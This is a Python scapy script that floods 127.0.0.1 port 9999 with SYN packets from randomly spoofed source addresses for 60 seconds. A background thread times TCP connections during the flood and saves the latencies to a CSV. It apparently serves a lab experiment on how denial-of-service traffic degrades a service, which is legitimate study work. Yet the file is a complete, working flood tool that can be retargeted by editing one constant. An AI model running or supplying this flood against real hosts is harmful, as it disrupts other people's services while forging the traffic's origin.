from scapy.all import *
import random
import time
import socket
import csv
import threading

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999
DURATION = 60
PACKET_RATE = 2000

latencies = []

def measure_latency():
    """Runs in background, measuring latency during attack"""
    time.sleep(2)  # wait 2 seconds for flood to start first
    print("\n[METER] Starting latency measurement during attack...")
    for i in range(50):
        try:
            start = time.time()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((TARGET_IP, TARGET_PORT))
            s.recv(1024)
            end = time.time()
            s.close()
            latency = (end - start) * 1000
            latencies.append(('during_attack', i+1, latency))
            print(f"  [METER] Request #{i+1:02d} | Latency: {latency:.2f} ms")
        except Exception as e:
            print(f"  [METER] Request #{i+1:02d} | FAILED/TIMEOUT: {e}")
            latencies.append(('during_attack', i+1, -1))
        time.sleep(0.3)

# Start latency meter in background thread
meter_thread = threading.Thread(target=measure_latency)
meter_thread.daemon = True
meter_thread.start()

# Start the flood
print(f"[*] Starting SYN Flood on {TARGET_IP}:{TARGET_PORT}")
print(f"[*] Duration: {DURATION}s | Rate: {PACKET_RATE} pkt/s\n")

start_time = time.time()
count = 0

while time.time() - start_time < DURATION:
    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    src_port = random.randint(1024, 65535)
    packet = IP(src=src_ip, dst=TARGET_IP) / TCP(
        sport=src_port,
        dport=TARGET_PORT,
        flags="S",
        seq=random.randint(0, 4294967295)
    )
    send(packet, verbose=0)
    count += 1
    time.sleep(1 / PACKET_RATE)

meter_thread.join(timeout=5)

# Save results
with open('during_attack.csv', 'w', newline='') as f:
    writer = csv.writer(f)
    writer.writerow(['phase', 'request_num', 'latency_ms'])
    writer.writerows(latencies)

valid = [l for _, _, l in latencies if l > 0]
avg = sum(valid) / len(valid) if valid else 0
print(f"\n[*] Attack complete! Sent {count} SYN packets")
print(f"[*] Average latency DURING attack: {avg:.2f} ms")
print(f"[*] Results saved to during_attack.csv")
